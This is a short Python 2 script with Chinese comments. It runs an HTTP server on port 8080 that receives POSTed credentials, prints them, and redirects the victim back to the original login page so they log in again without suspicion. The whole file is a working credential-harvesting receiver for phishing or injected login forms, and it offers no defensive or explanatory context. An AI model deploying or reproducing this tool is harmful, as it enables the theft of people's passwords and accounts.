#!/usr/bin/env python
# -*- coding: utf-8 -*-

# 创建接收服务器

import SimpleHTTPServer
import SocketServer
import urllib
import socket
import urlparse

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        # content_length = int(self.headers.getheaders("Content-Length")[0])

        creds = self.rfile.read(content_length).decode('utf-8')
        print creds

        # 重定向到登陆页面（需要再次登陆）
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()

server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()